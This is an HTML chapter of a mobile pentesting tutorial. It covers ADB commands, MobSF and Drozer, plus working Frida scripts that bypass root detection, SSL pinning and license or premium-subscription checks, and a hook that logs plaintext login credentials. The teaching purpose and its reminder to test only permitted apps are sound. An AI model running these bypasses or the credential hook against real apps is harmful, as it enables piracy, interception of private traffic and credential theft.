            <h4>ADB Essential Commands (Complete Reference)</h4>

            <div class="code"># ==================== DEVICE MANAGEMENT ====================

# adb devices
# List all connected devices
adb devices

# adb devices -l
# List devices with details (model, product, transport)
adb devices -l

# Output:
# emulator-5554          device product:sdk_gphone64_arm64 model:sdk_gphone64_arm64 device:emu64a transport_id:1

# adb connect <ip>:<port>
# Connect to device over network (WiFi ADB)
adb connect 192.168.1.100:5555

# adb disconnect
# Disconnect all network devices
adb disconnect

# adb -s <device_id> <command>
# Run command on specific device (when multiple devices connected)
adb -s emulator-5554 shell

# adb kill-server
# Stop ADB server
adb kill-server

# adb start-server
# Start ADB server
adb start-server

# ==================== APP INSTALLATION ====================

# adb install <apk>
# Install APK to device
adb install myapp.apk

# Output:
# Performing Streamed Install
# Success

# adb install -r <apk>
# Reinstall existing app (keeps data)
adb install -r myapp.apk

# adb install -g <apk>
# Install and grant all permissions
adb install -g myapp.apk

# adb install -d <apk>
# Allow version downgrade
adb install -d myapp_v1.0.apk

# adb install -t <apk>
# Allow test APKs
adb install -t debug.apk

# adb uninstall <package_name>
# Uninstall app
adb uninstall com.example.myapp

# adb uninstall -k <package_name>
# Uninstall but keep data
adb uninstall -k com.example.myapp

# ==================== FILE TRANSFER ====================

# adb push <local> <remote>
# Copy file from computer to device
adb push payload.txt /sdcard/Download/

# adb push directory/ <remote>
# Copy entire directory
adb push tools/ /sdcard/tools/

# adb pull <remote> <local>
# Copy file from device to computer
adb pull /sdcard/DCIM/Camera/photo.jpg ./

# adb pull /data/data/com.example.app/databases/ ./databases/
# Pull app's databases (requires root!)

# ==================== SHELL ACCESS ====================

# adb shell
# Open interactive shell on device
adb shell

# Now you're inside Android! You can run Linux commands:
# ls /sdcard/
# cd /data/app/
# ps -A    (list all processes)
# exit     (leave shell)

# adb shell <command>
# Run single command without interactive shell
adb shell ls -la /sdcard/

# adb shell 'command1; command2'
# Run multiple commands
adb shell 'cd /sdcard/ && ls'

# adb root
# Restart ADB daemon with root permissions (rooted devices only)
adb root

# Output:
# restarting adbd as root

# adb unroot
# Restart ADB daemon without root
adb unroot

# ==================== PACKAGE MANAGER (pm) ====================

# adb shell pm list packages
# List ALL installed packages
adb shell pm list packages

# Output (partial):
# package:com.android.camera
# package:com.example.myapp
# package:com.whatsapp
# [hundreds more...]

# adb shell pm list packages -f
# List packages with APK file paths
adb shell pm list packages -f

# Output:
# package:/data/app/com.example.myapp-xyz=/com.example.myapp

# adb shell pm list packages -3
# List only third-party apps (not system apps)
adb shell pm list packages -3

# adb shell pm list packages <keyword>
# Filter packages by keyword
adb shell pm list packages | grep bank

# Output:
# package:com.bankofamerica.mobile
# package:com.chase.banking

# adb shell pm path <package>
# Show APK path for package
adb shell pm path com.example.myapp

# Output:
# package:/data/app/com.example.myapp-ABC123/base.apk

# adb shell pm dump <package>
# Show EVERYTHING about a package
adb shell pm dump com.example.myapp

# Output:
# Package [com.example.myapp] (12a34b56):
#   userId=10123
#   pkg=Package{...}
#   codePath=/data/app/com.example.myapp-ABC123
#   resourcePath=/data/app/com.example.myapp-ABC123
#   legacyNativeLibraryDir=/data/app/com.example.myapp-ABC123/lib
#   primaryCpuAbi=arm64-v8a
#   versionCode=100 minSdk=21 targetSdk=33
#   versionName=1.0.0
#   [... TONS more info ...]

# adb shell pm grant <package> <permission>
# Grant permission to app
adb shell pm grant com.example.myapp android.permission.CAMERA

# adb shell pm revoke <package> <permission>
# Revoke permission from app
adb shell pm revoke com.example.myapp android.permission.CAMERA

# adb shell pm clear <package>
# Clear app data (like "Clear Cache" in settings)
adb shell pm clear com.example.myapp

# Output:
# Success

# ==================== ACTIVITY MANAGER (am) ====================

# adb shell am start <intent>
# Launch an app/activity
adb shell am start -n com.example.myapp/.MainActivity

# -n = component name (package/activity)
# Output:
# Starting: Intent { cmp=com.example.myapp/.MainActivity }

# adb shell am start -a <action>
# Start activity with action
adb shell am start -a android.intent.action.VIEW -d https://example.com

# Opens URL in default browser

# adb shell am startservice <intent>
# Start a service
adb shell am startservice -n com.example.myapp/.MyService

# adb shell am broadcast <intent>
# Send broadcast
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED

# Simulates device boot

# adb shell am force-stop <package>
# Force-stop an app
adb shell am force-stop com.example.myapp

# adb shell am kill <package>
# Kill app (less aggressive than force-stop)
adb shell am kill com.example.myapp

# ==================== LOGS ====================

# adb logcat
# View system logs in real-time
adb logcat

# Output (scrolls continuously):
# 01-07 14:30:45.123  1234  5678 I ActivityManager: Start proc 9999:com.example.myapp
# 01-07 14:30:45.456  9999  9999 D MyApp: User logged in: user@example.com
# 01-07 14:30:45.789  9999  9999 E MyApp: Error: java.lang.NullPointerException
# [... continuous stream ...]

# adb logcat -c
# Clear the log buffer
adb logcat -c

# adb logcat <tag>:V
# Filter by tag (V=Verbose, show everything for this tag)
adb logcat MyApp:V *:S

# *:S = silence all other tags
# Shows only logs from "MyApp" tag

# adb logcat *:E
# Show only ERROR level logs
adb logcat *:E

# adb logcat | grep "password"
# Search logs for keyword
adb logcat | grep -i "password"

# Dangerous if app logs passwords!

# adb logcat -v time
# Add timestamps to logs
adb logcat -v time

# adb logcat -d
# Dump logs and exit (don't follow)
adb logcat -d > logs.txt

# Saves logs to file

# ==================== SYSTEM INFORMATION ====================

# adb shell dumpsys
# Dump system services info (HUGE output!)
adb shell dumpsys

# adb shell dumpsys battery
# Show battery info
adb shell dumpsys battery

# Output:
# Current Battery Service state:
#   AC powered: false
#   USB powered: true
#   level: 85
#   temperature: 280
#   voltage: 4235

# adb shell dumpsys package <package>
# Show package details (like pm dump but different format)
adb shell dumpsys package com.example.myapp

# adb shell dumpsys activity
# Show activity stack (what apps are running)
adb shell dumpsys activity

# adb shell dumpsys meminfo <package>
# Show memory usage
adb shell dumpsys meminfo com.example.myapp

# Output:
# Applications Memory Usage (in Kilobytes):
# Uptime: 123456 Realtime: 123456
# 
# ** MEMINFO in pid 12345 [com.example.myapp] **
#                    Pss  Private  Shared
#           Native Heap    10000     9000    1000
#           Dalvik Heap    20000    19000    1000
#                  [...]
#                  TOTAL    50000    45000    5000

# adb shell dumpsys window
# Show window manager state
adb shell dumpsys window

# adb shell dumpsys connectivity
# Show network connectivity info
adb shell dumpsys connectivity

# ==================== SCREENSHOTS & RECORDINGS ====================

# adb shell screencap /sdcard/screen.png
# Take screenshot
adb shell screencap /sdcard/screen.png
adb pull /sdcard/screen.png ./

# adb shell screenrecord /sdcard/demo.mp4
# Record screen video
adb shell screenrecord /sdcard/demo.mp4

# Press Ctrl+C to stop recording
# Then:
adb pull /sdcard/demo.mp4 ./

# adb shell screenrecord --time-limit <seconds>
# Record for specific duration
adb shell screenrecord --time-limit 30 /sdcard/demo.mp4

# Records for 30 seconds then stops

# ==================== NETWORKING ====================

# adb shell netstat
# Show network connections
adb shell netstat

# adb shell ip addr
# Show IP addresses
adb shell ip addr

# adb shell ping <host>
# Ping a host
adb shell ping google.com

# adb shell tcpdump -w /sdcard/capture.pcap
# Capture network traffic (requires tcpdump on device)
adb shell tcpdump -w /sdcard/capture.pcap
# Then:
adb pull /sdcard/capture.pcap ./

# ==================== ADVANCED / PENTESTING ====================

# adb shell run-as <package>
# Run commands as the app's user (access app's private data)
adb shell
# Inside shell:
run-as com.example.myapp
cd /data/data/com.example.myapp/databases/
ls -la

# Output:
# -rw------- 1 u0_a123 u0_a123 12345 2026-01-07 14:30 userdata.db

# Now you can read the app's database!

# adb backup <package>
# Backup app data
adb backup -f backup.ab com.example.myapp

# Creates backup.ab file
# To extract:
# dd if=backup.ab bs=1 skip=24 | openssl zlib -d | tar -xvf -

# adb restore <backup_file>
# Restore app data
adb restore backup.ab

# adb shell cat /proc/net/tcp
# Show TCP connections (hexadecimal format)
adb shell cat /proc/net/tcp

# adb shell su
# Switch to root user (rooted devices only)
adb shell
su
# Now you have root shell (#)
# Can access /data/data/ directories of all apps!

# adb forward tcp:<local_port> tcp:<remote_port>
# Port forwarding (access device services from computer)
adb forward tcp:8080 tcp:8080

# Now accessing localhost:8080 on your computer connects to device's port 8080!</div>

            <div class="metaphor-box">
                <h4>💡 ADB is Your Remote Control for Android</h4>
                <p>Think of ADB like a universal remote for Android devices:<br><br>
                • <strong>Install/uninstall apps:</strong> Like a software store manager<br>
                • <strong>Transfer files:</strong> Like a USB cable on steroids<br>
                • <strong>View logs:</strong> Like reading the device's diary<br>
                • <strong>Shell access:</strong> Like having a terminal inside the phone<br>
                • <strong>Package manager:</strong> Like Android's app inventory system<br>
                • <strong>Activity manager:</strong> Like the phone's task manager<br><br>
                For pentesters, ADB is ESSENTIAL for dynamic analysis. You use it to:<br>
                1. Install modified APKs<br>
                2. Pull app databases and config files<br>
                3. Monitor logs for sensitive data leakage<br>
                4. Access app's private directory (with run-as or root)<br>
                5. Intercept network traffic<br><br>
                Master ADB = Master mobile pentesting!</p>
            </div>

<h3>Part 4: MobSF - Mobile Security Framework</h3>

<p><strong>MobSF</strong> is an automated mobile app security testing framework. It combines static analysis, dynamic analysis, and security report generation into ONE powerful tool with a web interface!</p>

<div class="code"># Install MobSF (Docker method - easiest):
docker pull opensecurity/mobile-security-framework-mobsf

# Run MobSF:
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Output:
# [INFO] MobSF is running on http://0.0.0.0:8000
# 
# Open browser: http://localhost:8000

# Manual install (alternative):
git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF.git
cd Mobile-Security-Framework-MobSF
./setup.sh
./run.sh

# Web interface opens at http://127.0.0.1:8000</div>

<h4>Using MobSF for Static Analysis</h4>

<div class="code"># Step 1: Open MobSF web interface (http://localhost:8000)

# Step 2: Upload APK
# - Click "Upload" button
# - Select your APK file
# - Wait for analysis (1-3 minutes)

# Step 3: View Security Report
# MobSF automatically analyzes:
# ✅ AndroidManifest.xml (permissions, components, attack surface)
# ✅ Decompiled code (hardcoded secrets, crypto issues, vulnerabilities)
# ✅ Binary analysis (native libraries)
# ✅ Network security (SSL pinning, cleartext traffic)
# ✅ OWASP Mobile Top 10 compliance
# ✅ Security score (0-100)

# Report sections:
# - File Info: App name, package, version, size, hashes
# - App Permissions: Dangerous permissions highlighted
# - Manifest Analysis: Exported components, debuggable flag
# - Code Analysis: Hardcoded secrets, insecure crypto, SQL injection
# - Binary Analysis: Native code security
# - File Analysis: Interesting files in APK
# - Certificate Info: Signing certificate details
# - Network Security: SSL/TLS configuration

# Step 4: Download Report
# Click "PDF Report" to get professional security assessment document!</div>

<h4>MobSF Dynamic Analysis</h4>

<div class="code"># Dynamic analysis requires running the app in an emulator/device

# Step 1: Set up Android emulator with MobSF support
# (Use Genymotion or Android Studio AVD with Google APIs)

# Step 2: Connect emulator to MobSF
# In MobSF web interface:
# - Click "Dynamic Analyzer"
# - Select your device/emulator
# - Click "Start Dynamic Analysis"

# Step 3: MobSF automatically:
# ✅ Installs the app
# ✅ Sets up proxy to intercept traffic
# ✅ Hooks into the app with Frida
# ✅ Monitors API calls, file operations, network requests

# Step 4: Use the app normally
# - Login, browse, perform actions
# - MobSF captures everything in background

# Step 5: View Dynamic Analysis Results
# - API Endpoints Discovered
# - Captured Network Traffic (HTTP/HTTPS)
# - Sensitive Data in Transit
# - Insecure Data Storage
# - Runtime Permissions Used
# - Screenshots of Each Activity</div>

<div class="info-box">
<h4>MobSF Security Checks (What It Looks For)</h4>
<p><strong>High Risk Issues:</strong><br>
• Hardcoded API keys, tokens, passwords<br>
• Debuggable flag enabled in AndroidManifest<br>
• Backup flag enabled (allows adb backup)<br>
• Weak cryptographic algorithms (DES, MD5)<br>
• SQL injection vulnerabilities<br>
• Command injection vulnerabilities<br>
• Insecure random number generation<br>
• Certificate pinning bypass methods<br><br>
<strong>Medium Risk Issues:</strong><br>
• Exported activities/services without permissions<br>
• Cleartext traffic allowed<br>
• Insufficient SSL/TLS validation<br>
• Insecure file permissions<br>
• Logging sensitive information<br><br>
<strong>Low Risk Issues:</strong><br>
• Obfuscation not enabled<br>
• Tapjacking vulnerabilities<br>
• Screenshot allowed on sensitive screens<br><br>
<strong>MobSF maps findings to:</strong><br>
• OWASP Mobile Top 10<br>
• CWE (Common Weakness Enumeration)<br>
• CVSS scores</p>
</div>

<h4>Interpreting MobSF Results</h4>

<div class="code"># Example MobSF findings:

# 🔴 HIGH: Hardcoded Secrets Found
# File: com/example/app/api/ApiClient.java
# Line: 15
# Code: private static final String API_KEY = "sk_live_1234567890";
# 
# Severity: HIGH
# CWE: CWE-798 (Use of Hard-coded Credentials)
# OWASP: M9 - Reverse Engineering
# 
# Impact: API key exposed, attackers can access backend services
# Recommendation: Store keys in secure keystore, never in code

# 🔴 HIGH: App is Debuggable
# File: AndroidManifest.xml
# Line: 8
# Code: android:debuggable="true"
# 
# Severity: HIGH
# CWE: CWE-215 (Information Exposure Through Debug Information)
# OWASP: M7 - Client Code Quality
# 
# Impact: App can be debugged with tools like Android Studio, allowing real-time code inspection
# Recommendation: Set android:debuggable="false" for production builds

# 🟡 MEDIUM: Exported Activity without Permission
# File: AndroidManifest.xml
# Component: com.example.app.SecretActivity
# Code: android:exported="true"
# 
# Severity: MEDIUM
# CWE: CWE-927 (Use of Implicit Intent for Sensitive Communication)
# OWASP: M1 - Improper Platform Usage
# 
# Impact: Other apps can launch this activity, potentially accessing sensitive functions
# Recommendation: Add permission check or set exported="false"

# 🟡 MEDIUM: Weak Cryptography - DES
# File: com/example/app/crypto/Encryption.java
# Line: 42
# Code: Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");
# 
# Severity: MEDIUM
# CWE: CWE-327 (Use of a Broken or Risky Cryptographic Algorithm)
# OWASP: M5 - Insufficient Cryptography
# 
# Impact: DES is easily brute-forced (56-bit key)
# Recommendation: Use AES-256 instead

# Overall Security Score: 45/100 (HIGH RISK)</div>

<div class="warning-box">
<h4>⚠️ MobSF Limitations</h4>
<p>MobSF is AMAZING but not perfect:<br><br>
<strong>False Positives:</strong> Some flagged issues may be intentional or not exploitable in context<br>
<strong>Obfuscation Blind Spots:</strong> Heavily obfuscated code may hide vulnerabilities<br>
<strong>Logic Flaws:</strong> Can't detect business logic issues (like "forgot password" bypass)<br>
<strong>Dynamic Analysis Requires Manual Testing:</strong> You still need to test all app features manually<br><br>
<strong>Best practice:</strong> Use MobSF as a starting point, then manually verify findings and test edge cases!</p>
</div>

            <h3>Part 5: Frida - Dynamic Instrumentation Framework</h3>

            <p><strong>Frida</strong> is a powerful dynamic instrumentation toolkit that lets you inject JavaScript into running processes on Android, iOS, Windows, Mac, and Linux. For mobile pentesting, it's your magic wand for bypassing security checks, hooking functions, and manipulating app behavior in real-time!</p>

            <div class="metaphor-box">
                <h4>💡 Frida = X-Ray Vision + Time Control for Apps</h4>
                <p>Imagine an app is a locked mansion with guards and security systems. Traditional static analysis (APKTool, Jadx) lets you study the blueprints after the fact. But Frida lets you:<br><br>
                • <strong>See through walls:</strong> Monitor what's happening inside while the app runs<br>
                • <strong>Freeze time:</strong> Intercept function calls before they execute<br>
                • <strong>Rewrite reality:</strong> Change function parameters, return values, even entire behaviors<br>
                • <strong>Read minds:</strong> Log private data being processed in memory<br><br>
                With Frida, you can bypass root detection, SSL pinning, jailbreak checks, license validation—all without modifying the APK!</p>
            </div>

            <h4>Installing Frida</h4>

            <div class="code"># Install Frida on your Kali machine:
pip3 install frida-tools

# Verify installation:
frida --version

# Output:
# 16.2.1

# Download frida-server for your Android device
# Check your device architecture first:
adb shell getprop ro.product.cpu.abi

# Output examples:
# arm64-v8a    ← 64-bit ARM (most modern phones)
# armeabi-v7a  ← 32-bit ARM (older phones)
# x86_64       ← 64-bit Intel (emulators)

# Download matching frida-server from:
# https://github.com/frida/frida/releases

# Example for arm64-v8a:
wget https://github.com/frida/frida/releases/download/16.2.1/frida-server-16.2.1-android-arm64.xz
unxz frida-server-16.2.1-android-arm64.xz
mv frida-server-16.2.1-android-arm64 frida-server

# Push to device:
adb push frida-server /data/local/tmp/

# Make executable:
adb shell "chmod 755 /data/local/tmp/frida-server"

# Run frida-server on device (requires root!):
adb shell "su -c /data/local/tmp/frida-server &"

# Or for non-root testing with specific apps:
adb shell "/data/local/tmp/frida-server"</div>

            <div class="warning-box">
                <h4>⚠️ Frida Requires Root for Most Features</h4>
                <p>To hook into arbitrary apps, your device needs root access. Alternatives:<br><br>
                <strong>Option 1: Rooted physical device</strong> (Magisk, SuperSU)<br>
                <strong>Option 2: Rooted emulator</strong> (Genymotion, Android Studio AVD with Google APIs)<br>
                <strong>Option 3: Frida Gadget</strong> (inject Frida into the APK itself - no root needed but requires repackaging)<br><br>
                For learning, use a rooted emulator like Genymotion!</p>
            </div>

            <h4>Frida Basics - Your First Hook</h4>

            <div class="code"># List all running processes:
frida-ps -U

# -U = USB device (or emulator)
# Output:
#  PID  Name
# ----  ------------------------------
# 1234  com.android.systemui
# 5678  com.example.targetapp
# 9012  com.google.android.gms
# [... more processes ...]

# List only apps (not system processes):
frida-ps -Ua

# Output:
#  PID  Name                         Identifier
# ----  ---------------------------  --------------------------
# 5678  Target App                   com.example.targetapp
# 9876  Banking App                  com.bankingapp.mobile

# Attach to a running app:
frida -U -n "Target App"

# -U = USB device
# -n = process name
# 
# Opens interactive Frida REPL (Read-Eval-Print Loop)

# Or attach by package name:
frida -U -f com.example.targetapp

# -f = spawn (launch the app with Frida attached from start)

# Or attach by PID:
frida -U 5678</div>

            <h4>Writing Frida Scripts - JavaScript Hooking</h4>

            <p>Frida uses JavaScript to interact with the target app. Here's the anatomy of a Frida script:</p>

            <div class="code"># Create a simple hook script: hook_example.js

Java.perform(function() {
    // Java.perform() ensures we're inside the Java runtime

    // 1. Get reference to the class you want to hook
    var MainActivity = Java.use('com.example.app.MainActivity');
    
    // 2. Hook a method
    MainActivity.checkLicense.implementation = function() {
        // This replaces the original checkLicense() method
        
        console.log('[*] checkLicense() called!');
        console.log('[*] Original would check license, but we\'re bypassing...');
        
        // Return true (license valid) regardless of actual check
        return true;
    };
    
    console.log('[+] License check bypassed!');
});

# Run the script:
frida -U -f com.example.app -l hook_example.js --no-pause

# Output:
# [+] License check bypassed!
# [*] checkLicense() called!
# [*] Original would check license, but we're bypassing...
# 
# The app now thinks it has a valid license!</div>

            <h4>Bypassing Root Detection with Frida</h4>

            <div class="code"># Many apps detect root and refuse to run
# Common checks: su binary exists, Magisk/SuperSU installed, test-keys build

# Create bypass_root_detection.js:

Java.perform(function() {
    console.log('[*] Root detection bypass started');

    // Method 1: Hook common root detection method
    var RootCheck = Java.use('com.example.app.security.RootDetector');
    
    RootCheck.isDeviceRooted.implementation = function() {
        console.log('[*] isDeviceRooted() called - returning false');
        return false;  // Always return false (not rooted)
    };
    
    // Method 2: Hook File.exists() to hide su binary
    var File = Java.use('java.io.File');
    
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        
        // List of paths that indicate root
        var rootPaths = [
            '/system/app/Superuser.apk',
            '/system/bin/su',
            '/system/xbin/su',
            '/data/local/xbin/su',
            '/sbin/su',
            '/system/sd/xbin/su',
            '/system/bin/failsafe/su',
            '/data/local/su'
        ];
        
        // If checking for root files, return false
        if (rootPaths.indexOf(path) !== -1) {
            console.log('[*] File.exists("' + path + '") intercepted - returning false');
            return false;
        }
        
        // Otherwise, call original method
        return this.exists.call(this);
    };
    
    // Method 3: Hook Runtime.exec() to prevent 'su' command execution
    var Runtime = Java.use('java.lang.Runtime');
    
    Runtime.exec.overload('java.lang.String').implementation = function(cmd) {
        if (cmd.indexOf('su') !== -1) {
            console.log('[*] Runtime.exec("' + cmd + '") intercepted - preventing execution');
            throw new Error('Command not found');
        }
        return this.exec.call(this, cmd);
    };
    
    // Method 4: Hook Build.TAGS to hide test-keys
    var Build = Java.use('android.os.Build');
    
    Build.TAGS.value = 'release-keys';  // Change from 'test-keys' to 'release-keys'
    console.log('[*] Build.TAGS changed to: ' + Build.TAGS.value);
    
    console.log('[+] Root detection fully bypassed!');
});

# Run it:
frida -U -f com.example.app -l bypass_root_detection.js --no-pause

# The app now runs on rooted device without detecting root!</div>

            <h4>Bypassing SSL Pinning with Frida</h4>

            <p>SSL pinning prevents Man-in-the-Middle attacks by only trusting specific certificates. But for pentesting, we WANT to intercept traffic with Burp Suite! Here's how to bypass it:</p>

            <div class="code"># Create bypass_ssl_pinning.js:

Java.perform(function() {
    console.log('[*] SSL Pinning bypass started');

    // Method 1: Hook TrustManager (most common SSL implementation)
    var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    
    // Create a custom TrustManager that trusts all certificates
    var TrustManager = Java.registerClass({
        name: 'com.frida.TrustManager',
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, authType) {
                console.log('[*] checkClientTrusted called - trusting all');
            },
            checkServerTrusted: function(chain, authType) {
                console.log('[*] checkServerTrusted called - trusting all');
            },
            getAcceptedIssuers: function() {
                console.log('[*] getAcceptedIssuers called - returning empty');
                return [];
            }
        }
    });
    
    // Replace SSLContext's TrustManager with our custom one
    var TrustManagers = [TrustManager.$new()];
    
    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(keyManager, trustManager, secureRandom) {
        console.log('[*] SSLContext.init() called - replacing TrustManager');
        this.init.call(this, keyManager, TrustManagers, secureRandom);
    };
    
    // Method 2: Hook OkHttp (popular HTTP library)
    try {
        var OkHttpClient = Java.use('okhttp3.OkHttpClient');
        var Builder = Java.use('okhttp3.OkHttpClient$Builder');
        
        Builder.certificatePinner.implementation = function(certificatePinner) {
            console.log('[*] OkHttp certificatePinner() called - disabling pinning');
            return this;  // Return builder without pinning
        };
        
        console.log('[+] OkHttp SSL pinning bypassed');
    } catch(err) {
        console.log('[-] OkHttp not found (app might not use it)');
    }
    
    // Method 3: Hook specific app's SSL verification
    // (You need to find the exact class/method via Jadx)
    try {
        var CustomPinning = Java.use('com.example.app.network.CertificatePinner');
        
        CustomPinning.check.implementation = function() {
            console.log('[*] Custom certificate check bypassed');
            return true;  // Always pass verification
        };
    } catch(err) {
        // App doesn't have custom pinning class
    }
    
    console.log('[+] SSL Pinning fully bypassed - use Burp Suite!');
});

# Run with the app:
frida -U -f com.example.app -l bypass_ssl_pinning.js --no-pause

# Configure Burp Suite proxy on your device:
# Settings → WiFi → Long-press network → Modify → Proxy: Manual
# Proxy hostname: 192.168.1.100 (your Kali IP)
# Proxy port: 8080

# Now all HTTPS traffic flows through Burp Suite with no certificate errors!</div>

            <h4>Logging Function Arguments and Return Values</h4>

            <div class="code"># Create log_function.js to spy on any function:

Java.perform(function() {
    var TargetClass = Java.use('com.example.app.auth.LoginManager');
    
    // Hook the login method
    TargetClass.doLogin.overload('java.lang.String', 'java.lang.String').implementation = function(username, password) {
        console.log('[*] ===== doLogin() called =====');
        console.log('[*] Username: ' + username);
        console.log('[*] Password: ' + password);  // DANGER: This logs plaintext passwords!
        
        // Call the original method and capture return value
        var result = this.doLogin(username, password);
        
        console.log('[*] Return value: ' + result);
        console.log('[*] ===========================');
        
        return result;  // Pass through the original return value
    };
});

# Run it:
frida -U -f com.example.app -l log_function.js --no-pause

# When user logs in:
# [*] ===== doLogin() called =====
# [*] Username: testuser@example.com
# [*] Password: MySecretPass123
# [*] Return value: true
# [*] ===========================

# You just intercepted the login credentials!</div>

            <h4>Modifying Function Return Values</h4>

            <div class="code"># Create bypass_premium_check.js:

Java.perform(function() {
    var UserAccount = Java.use('com.example.app.model.UserAccount');
    
    // Hook isPremiumUser method
    UserAccount.isPremiumUser.implementation = function() {
        console.log('[*] isPremiumUser() called');
        
        // Original method would check subscription status
        // But we'll just return true!
        console.log('[*] Returning true (premium access granted)');
        return true;
    };
    
    // Hook getSubscriptionExpiry method
    UserAccount.getSubscriptionExpiry.implementation = function() {
        console.log('[*] getSubscriptionExpiry() called');
        
        // Return a date far in the future
        var futureDate = Java.use('java.util.Date').$new();
        futureDate.setYear(2099);  // Subscription expires in 2099!
        
        console.log('[*] Returning subscription expiry: 2099');
        return futureDate;
    };
    
    console.log('[+] Premium bypass active - enjoy all features for free!');
});

# Now the app thinks you have a premium subscription!</div>

            <h4>Frida CLI Tools Reference</h4>

            <div class="code"># frida-ps: List processes
frida-ps -U          # List all processes on USB device
frida-ps -Ua         # List only applications
frida-ps -Uai        # List installed applications (not just running)

# frida: Attach and run scripts
frida -U -n "App Name"                    # Attach to running app by name
frida -U -f com.example.app               # Spawn app with Frida attached
frida -U -f com.example.app --no-pause   # Spawn and don't pause at startup
frida -U -p 1234                          # Attach to process ID 1234
frida -U -f com.example.app -l script.js  # Run script on spawn

# frida-trace: Auto-generate hooks
frida-trace -U -f com.example.app -j '*!*Login*'

# -j = Java method pattern
# '*!*Login*' = All classes, methods containing "Login"
# Auto-generates hook scripts for each method!

# Example: Trace all SSL-related methods:
frida-trace -U -f com.example.app -j '*!*SSL*'

# Trace specific class:
frida-trace -U -f com.example.app -j 'com.example.app.MainActivity!*'

# frida-discover: Discover app's classes and methods
frida-discover -U com.example.app

# frida-ls: List files accessible to app
frida-ls -U com.example.app /data/data/com.example.app/

# frida-kill: Kill a process
frida-kill -U com.example.app</div>

            <div class="metaphor-box">
                <h4>🎉 Frida = Your Mobile App Superpowers!</h4>
                <p>You've learned how to:<br><br>
                ✅ <strong>Bypass root detection</strong> → Run pentesting tools on production apps<br>
                ✅ <strong>Bypass SSL pinning</strong> → Intercept HTTPS traffic with Burp Suite<br>
                ✅ <strong>Hook any function</strong> → Log arguments, modify returns, change behavior<br>
                ✅ <strong>Bypass premium checks</strong> → Test app features without paying<br>
                ✅ <strong>Extract sensitive data</strong> → Capture passwords, tokens, API keys in memory<br><br>
                Frida is the most powerful tool for mobile dynamic analysis. Combine it with static analysis (APKTool, Jadx) and you can break almost any mobile app!<br><br>
                <strong>Practice challenges:</strong><br>
                • Download InsecureBankv2 (intentionally vulnerable app)<br>
                • Try bypassing its root detection<br>
                • Hook the login function to log credentials<br>
                • Bypass premium features<br><br>
                Remember: Only test apps you have permission to test! 🚀</p>
            </div>

            <h3>Part 6: Drozer - Android Security Assessment Framework</h3>

            <p><strong>Drozer</strong> (formerly Mercury) is a comprehensive security audit and attack framework for Android. It finds and exploits vulnerabilities in Android apps and devices by simulating a malicious app trying to interact with target components.</p>

            <div class="metaphor-box">
                <h4>💡 Drozer = Social Engineering for Android Apps</h4>
                <p>Think of Android apps as houses in a neighborhood. Some houses have unlocked windows (exported components), some leave their WiFi passwords written on the door (insecure data storage), some trust any visitor claiming to be the mailman (intent vulnerabilities).<br><br>
                Drozer is like a burglar doing reconnaissance:<br>
                • <strong>Finding entry points:</strong> Exported activities, services, broadcast receivers, content providers<br>
                • <strong>Testing locks:</strong> Checking if components require permissions<br>
                • <strong>Exploiting trust:</strong> Sending malicious intents to trigger unexpected behavior<br>
                • <strong>Stealing data:</strong> Querying content providers without authorization<br><br>
                Drozer automates the discovery and exploitation of these Android-specific vulnerabilities!</p>
            </div>

            <h4>Installing Drozer</h4>

            <div class="code"># Install Drozer on Kali:
# (Drozer Python 3 fork)
git clone https://github.com/WithSecureLabs/drozer.git
cd drozer
pip3 install .

# Verify installation:
drozer --version

# Output:
# drozer 3.0.0

# Download and install Drozer Agent APK on Android device:
wget https://github.com/WithSecureLabs/drozer-agent/releases/download/3.0.0/drozer-agent.apk
adb install drozer-agent.apk

# Launch Drozer Agent app on your device
# Tap "Embedded Server" toggle to start server
# Default port: 31415</div>

            <h4>Connecting Drozer to Your Device</h4>

            <div class="code"># Forward the Drozer port from device to your Kali machine:
adb forward tcp:31415 tcp:31415

# Connect to the Drozer agent:
drozer console connect

# Output:
#             ..                    ..:.
#            ..o..                  .r..
#             ..a..  . ....... .  ..nd
#               ro..idsnemesisand..pr
#               .otectorandroidsneme.
#            .,sisandprotectorandroids+.
#          ..nemesisandprotectorandroidsn:.
#        .emesisandprotectorandroidsnemes..
#      ..isandp,..,rotectorandro,..,idsnem.
#      .isisandp..rotectorandroid..snemisis.
#      ,andprotectorandroidsnemisisandprotec.
#     .torandroidsnemesisandprotectorandroid.
#     .snemisisandprotectorandroidsnemesisan:
#     .dprotectorandroidsnemesisandprotector.
#
# drozer Console (v3.0.0)
# dz>

# You're now connected to the device!</div>

            <h4>Drozer Basic Commands - Information Gathering</h4>

            <div class="code"># Inside Drozer console (dz>):

# List all installed packages:
dz> run app.package.list

# Output:
# com.android.browser
# com.android.calendar
# com.example.vulnerableapp
# [hundreds more...]

# Search for a specific app:
dz> run app.package.list -f bank

# Output:
# com.bankofamerica.mobile
# com.chase.banking
# com.example.bankingapp

# Get detailed info about a package:
dz> run app.package.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   Process Name: com.example.vulnerableapp
#   Version: 1.0.0
#   Data Directory: /data/user/0/com.example.vulnerableapp
#   APK Path: /data/app/com.example.vulnerableapp-xyz=/base.apk
#   UID: 10123
#   GID: [3003, 1015, 1028]
#   Shared Libraries: null
#   Shared User ID: null
#   Permissions:
#     - android.permission.INTERNET
#     - android.permission.WRITE_EXTERNAL_STORAGE
#     - android.permission.READ_EXTERNAL_STORAGE</div>

            <h4>Identifying Attack Surface</h4>

            <div class="code"># Find exported activities (can be launched by other apps):
dz> run app.activity.info -a com.example.vulnerableapp

# Output:
# Package: com.example.vulnerableapp
#   com.example.vulnerableapp.MainActivity
#     Permission: null                    ← NO PERMISSION REQUIRED!
#     Exported: True                      ← ACCESSIBLE BY ANY APP!
#   com.example.vulnerableapp.SecretActivity
#     Permission: null
#     Exported: True                      ← VULNERABILITY!

# Launch the secret activity:
dz> run app.activity.start --component com.example.vulnerableapp com.example.vulnerableapp.SecretActivity

# The secret activity opens! (Should have been protected)

